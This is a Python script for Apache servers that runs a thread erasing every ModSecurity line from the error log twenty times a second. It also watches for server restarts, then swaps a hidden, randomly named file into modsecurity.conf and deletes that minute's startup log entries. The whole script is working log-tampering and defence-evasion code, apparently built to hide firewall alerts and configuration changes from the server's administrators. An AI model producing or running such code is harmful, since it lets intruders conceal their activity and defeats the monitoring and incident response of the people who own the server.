#!/usr/bin/env python3

import os
import re
import time
import fcntl
import subprocess
import threading
from datetime import datetime

LOG_FILE = "/var/log/apache2/error.log"
MODSEC_BASE = "/etc/modsecurity/modsecurity.conf"
MODSEC_TEMP = "/etc/modsecurity/modsecuritybL6qM.conf"
SCRIPT_LOG = "/var/tmp/cleaner_bL6qM1.log"
COOLDOWN_FILE = "/var/tmp/last_restart_trigger_bL6qM.txt"
COOLDOWN_SECONDS = 80
CLEAN_INTERVAL = 0.05

MODSEC_PATTERN = re.compile(r'.*ModSecurity.*\n?')
RESTART_PATTERN = re.compile(r'\[mpm_\w+:notice\].*configured|Apache/.* \(Unix\).*resuming|Server built:')
STARTUP_PATTERNS = [
    'Apache/2', 'mpm_', 'configured', 'resuming', 'SIG', 'Command line',
    'Server built', 'mod_security', 'APR', 'OpenSSL', 'ssl:warn',
    'AH01906', 'AH01909', 'PCRE2', 'LUA', 'YAJL', 'LIBXML', 'Status engine'
]


def log(category, message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    try:
        with open(SCRIPT_LOG, 'a') as f:
            f.write(f"{timestamp} | {category} | {message}\n")
    except Exception:
        pass


def atomic_clean_modsec(file_path):
    if not os.path.exists(file_path):
        return False
    
    lock_file = f"{file_path}.lock"
    
    try:
        lock_fd = os.open(lock_file, os.O_CREAT | os.O_WRONLY, 0o644)
        
        try:
            fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError:
            os.close(lock_fd)
            return False
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        filtered_lines = [line for line in lines if 'ModSecurity' not in line]
        
        if len(filtered_lines) == len(lines):
            fcntl.flock(lock_fd, fcntl.LOCK_UN)
            os.close(lock_fd)
            os.remove(lock_file)
            return False
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(filtered_lines)
        
        fcntl.flock(lock_fd, fcntl.LOCK_UN)
        os.close(lock_fd)
        os.remove(lock_file)
        
        return True
        
    except Exception as e:
        log("Error", f"atomic_clean_modsec: {e}")
        try:
            os.close(lock_fd)
            os.remove(lock_file)
        except Exception:
            pass
        return False


def check_cooldown():
    if not os.path.exists(COOLDOWN_FILE):
        return True
    
    try:
        with open(COOLDOWN_FILE, 'r') as f:
            last_run = int(f.read().strip())
        
        current_time = int(time.time())
        diff = current_time - last_run
        
        if diff < COOLDOWN_SECONDS:
            log("Cooldown", f"Skipped ({diff}s since last run)")
            return False
    except Exception:
        pass
    
    return True


def clean_startup_logs(file_path):
    if not os.path.exists(file_path):
        return False
    
    lock_file = f"{file_path}.lock"
    
    try:
        now = datetime.now()
        date_part = now.strftime('%a %b %e')
        hour_min = now.strftime('%H:%M')
        year = now.strftime('%Y')
        
        time_pattern = re.compile(
            rf'\[{re.escape(date_part)}\s+{hour_min}:.*{year}\].*(' + 
            '|'.join(re.escape(p) for p in STARTUP_PATTERNS) + ')'
        )
        
        lock_fd = os.open(lock_file, os.O_CREAT | os.O_WRONLY, 0o644)
        fcntl.flock(lock_fd, fcntl.LOCK_EX)
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        filtered_lines = [line for line in lines if not time_pattern.search(line)]
        
        if len(filtered_lines) < len(lines):
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(filtered_lines)
            
            log("Startup", "Current_Restart_Logs_Cleaned")
            result = True
        else:
            result = False
        
        fcntl.flock(lock_fd, fcntl.LOCK_UN)
        os.close(lock_fd)
        os.remove(lock_file)
        
        return result
        
    except Exception as e:
        log("Error", f"clean_startup_logs: {e}")
        try:
            os.close(lock_fd)
            os.remove(lock_file)
        except Exception:
            pass
        return False


def handle_restart():
    log("Restart", "Detected")
    
    if not check_cooldown():
        return
    
    try:
        with open(COOLDOWN_FILE, 'w') as f:
            f.write(str(int(time.time())))
    except Exception:
        pass
    
    if os.path.exists(MODSEC_TEMP):
        try:
            os.rename(MODSEC_TEMP, MODSEC_BASE)
            log("Config", "Restored")
        except Exception as e:
            log("Error", f"Config restore failed: {e}")
    
    time.sleep(3)
    
    clean_startup_logs(LOG_FILE)


def modsec_cleaner_thread():
    log("ModSec_Cleaner", f"Started (Interval: {CLEAN_INTERVAL}s)")
    
    while True:
        try:
            time.sleep(CLEAN_INTERVAL)
            atomic_clean_modsec(LOG_FILE)
        except Exception as e:
            log("Error", f"modsec_cleaner_thread: {e}")


def monitor_restart():
    log("Monitor", "Started")
    
    if atomic_clean_modsec(LOG_FILE):
        log("Init", "Initial_Cleanup_Done")
    
    try:
        process = subprocess.Popen(
            ['tail', '-F', '-n', '0', LOG_FILE],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            bufsize=1
        )
        
        for line in process.stdout:
            if RESTART_PATTERN.search(line):
                log("Debug", f"Matched: {line.strip()[:150]}")
                handle_restart()
                
    except Exception as e:
        log("Error", f"monitor_restart: {e}")


def main():
    cleaner_thread = threading.Thread(target=modsec_cleaner_thread, daemon=True)
    cleaner_thread.start()
    
    monitor_restart()


if __name__ == "__main__":
    main()
